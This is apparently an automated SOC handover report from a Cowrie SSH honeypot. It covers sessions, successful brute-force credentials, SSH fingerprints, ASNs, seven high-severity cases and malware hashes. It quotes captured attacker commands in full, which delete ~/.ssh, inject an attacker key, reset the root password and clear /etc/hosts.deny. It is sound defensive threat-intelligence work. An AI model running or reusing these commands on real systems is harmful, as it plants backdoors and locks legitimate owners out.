# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-12 |
| **Generated At** | 2026-05-12T21:23:35Z |
| **Shift Time** | 21:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **707** |
| Confirmed Threats | **524** |
| False Positives Filtered | **183** (25.9%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **21** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **700** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **14** |
| Unique Credential Pairs | **8** |
| Unique Usernames | **5** |
| Unique Passwords | **7** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `345gs5662d34` | 4 |
| `user1` | 1 |
| `user3` | 1 |
| `jbernal` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 3 |
| `Admin+123` | 2 |
| `123456` | 2 |
| `douglas` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `Admin+123` | 2 |
| `root` | `douglas` | 1 |
| `root` | `anand123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `douglas` | `150.139.201.247` | 2026-05-12T18:45:59 |
| `root` | `3245gs5662d34` | `150.139.201.247` | 2026-05-12T18:46:03 |
| `root` | `Admin+123` | `49.75.185.71` | 2026-05-12T18:48:35 |
| `root` | `anand123` | `103.43.191.43` | 2026-05-12T18:50:39 |
| `root` | `3245gs5662d34` | `103.43.191.43` | 2026-05-12T18:50:45 |
| `root` | `Admin+123` | `94.29.124.154` | 2026-05-12T18:51:25 |
| `root` | `3245gs5662d34` | `94.29.124.154` | 2026-05-12T18:51:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **707** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 18 | 3 |
| `03a80b21afa8...` | Modern SSH client | 9 | 5 |
| `14b2ddda386a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 18 | 3 | libssh-based |
| `03a80b21afa8...` | libssh | 9 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 1 | — |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:dtXAFEkDkb0y"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `49.75.185.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `150.139.201.247`, `103.43.191.43`, `94.29.124.154`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **36** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS138423` | CMPak Limited | 2 | HIGH |
| `AS135799` | Rapidnet Private Limited | 2 | LOW |
| `AS141679` | China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch | 1 | HIGH |
| `AS59395` | Southern Communications Ltd | 1 | LOW |
| `AS27747` | Telecentro S.A. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a6657ecbaa5e

| Field | Detail |
|---|---|
| **Source IP** | `150.139.201[.]247` |
| **First Seen** | 2026-05-12 18:45 |
| **Last Seen** | 2026-05-12 18:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 18:45:58` | `cowrie.session.connect` |
| `2026-05-12 18:45:58` | `cowrie.client.version` |
| `2026-05-12 18:45:58` | `cowrie.client.kex` |
| `2026-05-12 18:45:59` | `cowrie.login.success` |
| `2026-05-12 18:45:59` | `cowrie.session.params` |
| `2026-05-12 18:45:59` | `cowrie.command.input` |
| `2026-05-12 18:45:59` | `cowrie.command.failed` |
| `2026-05-12 18:45:59` | `cowrie.log.closed` |
| `2026-05-12 18:46:00` | `cowrie.session.params` |
| `2026-05-12 18:46:00` | `cowrie.command.input` |
| `2026-05-12 18:46:00` | `cowrie.session.file_download` |
| `2026-05-12 18:46:00` | `cowrie.log.closed` |
| `2026-05-12 18:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.139.201[.]247` to AbuseIPDB if not already reported
- [ ] Block `150.139.201[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aeb1622e9b3

| Field | Detail |
|---|---|
| **Source IP** | `150.139.201[.]247` |
| **First Seen** | 2026-05-12 18:46 |
| **Last Seen** | 2026-05-12 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 18:46:02` | `cowrie.session.connect` |
| `2026-05-12 18:46:02` | `cowrie.client.version` |
| `2026-05-12 18:46:02` | `cowrie.client.kex` |
| `2026-05-12 18:46:03` | `cowrie.login.success` |
| `2026-05-12 18:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.139.201[.]247` to AbuseIPDB if not already reported
- [ ] Block `150.139.201[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-535ce3607d2d

| Field | Detail |
|---|---|
| **Source IP** | `49.75.185[.]71` |
| **First Seen** | 2026-05-12 18:48 |
| **Last Seen** | 2026-05-12 18:48 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:dtXAFEkDkb0y"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 18:48:35` | `cowrie.session.connect` |
| `2026-05-12 18:48:35` | `cowrie.client.version` |
| `2026-05-12 18:48:35` | `cowrie.client.kex` |
| `2026-05-12 18:48:35` | `cowrie.login.success` |
| `2026-05-12 18:48:36` | `cowrie.session.params` |
| `2026-05-12 18:48:36` | `cowrie.command.input` |
| `2026-05-12 18:48:36` | `cowrie.command.failed` |
| `2026-05-12 18:48:36` | `cowrie.log.closed` |
| `2026-05-12 18:48:36` | `cowrie.session.params` |
| `2026-05-12 18:48:36` | `cowrie.command.input` |
| `2026-05-12 18:48:36` | `cowrie.session.file_download` |
| `2026-05-12 18:48:36` | `cowrie.log.closed` |
| `2026-05-12 18:48:47` | `cowrie.session.params` |
| `2026-05-12 18:48:47` | `cowrie.command.input` |
| `2026-05-12 18:48:47` | `cowrie.log.closed` |
| `2026-05-12 18:48:47` | `cowrie.session.params` |
| `2026-05-12 18:48:47` | `cowrie.command.input` |
| `2026-05-12 18:48:48` | `cowrie.log.closed` |
| `2026-05-12 18:48:48` | `cowrie.session.params` |
| `2026-05-12 18:48:48` | `cowrie.command.input` |
| `2026-05-12 18:48:48` | `cowrie.session.file_download` |
| `2026-05-12 18:48:48` | `cowrie.log.closed` |
| `2026-05-12 18:48:48` | `cowrie.session.params` |
| `2026-05-12 18:48:48` | `cowrie.command.input` |
| `2026-05-12 18:48:49` | `cowrie.log.closed` |
| `2026-05-12 18:48:49` | `cowrie.session.params` |
| `2026-05-12 18:48:49` | `cowrie.command.input` |
| `2026-05-12 18:48:49` | `cowrie.log.closed` |
| `2026-05-12 18:48:49` | `cowrie.session.params` |
| `2026-05-12 18:48:49` | `cowrie.command.input` |
| `2026-05-12 18:48:49` | `cowrie.command.input` |
| `2026-05-12 18:48:50` | `cowrie.log.closed` |
| `2026-05-12 18:48:50` | `cowrie.session.params` |
| `2026-05-12 18:48:50` | `cowrie.command.input` |
| `2026-05-12 18:48:50` | `cowrie.log.closed` |
| `2026-05-12 18:48:50` | `cowrie.session.params` |
| `2026-05-12 18:48:50` | `cowrie.command.input` |
| `2026-05-12 18:48:50` | `cowrie.log.closed` |
| `2026-05-12 18:48:51` | `cowrie.session.params` |
| `2026-05-12 18:48:51` | `cowrie.command.input` |
| `2026-05-12 18:48:51` | `cowrie.log.closed` |
| `2026-05-12 18:48:51` | `cowrie.session.params` |
| `2026-05-12 18:48:51` | `cowrie.command.input` |
| `2026-05-12 18:48:51` | `cowrie.log.closed` |
| `2026-05-12 18:48:52` | `cowrie.session.params` |
| `2026-05-12 18:48:52` | `cowrie.command.input` |
| `2026-05-12 18:48:52` | `cowrie.log.closed` |
| `2026-05-12 18:48:52` | `cowrie.session.params` |
| `2026-05-12 18:48:52` | `cowrie.command.input` |
| `2026-05-12 18:48:52` | `cowrie.log.closed` |
| `2026-05-12 18:48:53` | `cowrie.session.params` |
| `2026-05-12 18:48:53` | `cowrie.command.input` |
| `2026-05-12 18:48:53` | `cowrie.log.closed` |
| `2026-05-12 18:48:53` | `cowrie.session.params` |
| `2026-05-12 18:48:53` | `cowrie.command.input` |
| `2026-05-12 18:48:53` | `cowrie.log.closed` |
| `2026-05-12 18:48:54` | `cowrie.session.params` |
| `2026-05-12 18:48:54` | `cowrie.command.input` |
| `2026-05-12 18:48:54` | `cowrie.log.closed` |
| `2026-05-12 18:48:54` | `cowrie.session.params` |
| `2026-05-12 18:48:54` | `cowrie.command.input` |
| `2026-05-12 18:48:54` | `cowrie.log.closed` |
| `2026-05-12 18:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.75.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `49.75.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2186aab2e6d

| Field | Detail |
|---|---|
| **Source IP** | `103.43.191[.]43` |
| **First Seen** | 2026-05-12 18:50 |
| **Last Seen** | 2026-05-12 18:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 18:50:37` | `cowrie.session.connect` |
| `2026-05-12 18:50:37` | `cowrie.client.version` |
| `2026-05-12 18:50:38` | `cowrie.client.kex` |
| `2026-05-12 18:50:39` | `cowrie.login.success` |
| `2026-05-12 18:50:39` | `cowrie.session.params` |
| `2026-05-12 18:50:39` | `cowrie.command.input` |
| `2026-05-12 18:50:39` | `cowrie.command.failed` |
| `2026-05-12 18:50:40` | `cowrie.log.closed` |
| `2026-05-12 18:50:40` | `cowrie.session.params` |
| `2026-05-12 18:50:40` | `cowrie.command.input` |
| `2026-05-12 18:50:40` | `cowrie.session.file_download` |
| `2026-05-12 18:50:40` | `cowrie.log.closed` |
| `2026-05-12 18:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.43.191[.]43` to AbuseIPDB if not already reported
- [ ] Block `103.43.191[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00461b33bf1e

| Field | Detail |
|---|---|
| **Source IP** | `103.43.191[.]43` |
| **First Seen** | 2026-05-12 18:50 |
| **Last Seen** | 2026-05-12 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 18:50:43` | `cowrie.session.connect` |
| `2026-05-12 18:50:43` | `cowrie.client.version` |
| `2026-05-12 18:50:44` | `cowrie.client.kex` |
| `2026-05-12 18:50:45` | `cowrie.login.success` |
| `2026-05-12 18:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.43.191[.]43` to AbuseIPDB if not already reported
- [ ] Block `103.43.191[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-126e9ef5d51d

| Field | Detail |
|---|---|
| **Source IP** | `94.29.124[.]154` |
| **First Seen** | 2026-05-12 18:51 |
| **Last Seen** | 2026-05-12 18:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 18:51:24` | `cowrie.session.connect` |
| `2026-05-12 18:51:24` | `cowrie.client.version` |
| `2026-05-12 18:51:24` | `cowrie.client.kex` |
| `2026-05-12 18:51:25` | `cowrie.login.success` |
| `2026-05-12 18:51:25` | `cowrie.session.params` |
| `2026-05-12 18:51:25` | `cowrie.command.input` |
| `2026-05-12 18:51:25` | `cowrie.command.failed` |
| `2026-05-12 18:51:26` | `cowrie.log.closed` |
| `2026-05-12 18:51:26` | `cowrie.session.params` |
| `2026-05-12 18:51:26` | `cowrie.command.input` |
| `2026-05-12 18:51:26` | `cowrie.session.file_download` |
| `2026-05-12 18:51:26` | `cowrie.log.closed` |
| `2026-05-12 18:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.29.124[.]154` to AbuseIPDB if not already reported
- [ ] Block `94.29.124[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db9b6b0c23a

| Field | Detail |
|---|---|
| **Source IP** | `94.29.124[.]154` |
| **First Seen** | 2026-05-12 18:51 |
| **Last Seen** | 2026-05-12 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 18:51:28` | `cowrie.session.connect` |
| `2026-05-12 18:51:28` | `cowrie.client.version` |
| `2026-05-12 18:51:29` | `cowrie.client.kex` |
| `2026-05-12 18:51:29` | `cowrie.login.success` |
| `2026-05-12 18:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.29.124[.]154` to AbuseIPDB if not already reported
- [ ] Block `94.29.124[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `23.94.77[.]145` | **458** | 2026-05-12 18:02 | 2026-05-12 21:22 | 231m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.124[.]182` | **25** | 2026-05-12 20:12 | 2026-05-12 20:17 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `111.228.58[.]144` | **20** | 2026-05-12 20:30 | 2026-05-12 20:47 | 35m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.118.202[.]126` | **2** | 2026-05-12 20:13 | 2026-05-12 20:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `49.75.185[.]71` | **2** | 2026-05-12 18:48 | 2026-05-12 18:50 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.11[.]137` | 1 | 2026-05-12 18:48 | 2026-05-12 18:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.43.191[.]43` | 1 | 2026-05-12 18:50 | 2026-05-12 18:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.147.40[.]93` | 1 | 2026-05-12 18:48 | 2026-05-12 18:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]75` | 1 | 2026-05-12 18:53 | 2026-05-12 18:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.139.201[.]247` | 1 | 2026-05-12 18:46 | 2026-05-12 18:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.24.211[.]100` | 1 | 2026-05-12 20:26 | 2026-05-12 20:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.37.141[.]110` | 1 | 2026-05-12 18:08 | 2026-05-12 18:08 | 14s | 0 | `T1592` | 🟢 LOW |
| `205.185.121[.]144` | 1 | 2026-05-12 18:27 | 2026-05-12 18:28 | 43s | 0 | `T1592` | 🟢 LOW |
| `220.190.103[.]234` | 1 | 2026-05-12 18:21 | 2026-05-12 18:21 | 12s | 0 | `T1592` | 🟢 LOW |
| `94.29.124[.]154` | 1 | 2026-05-12 18:51 | 2026-05-12 18:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
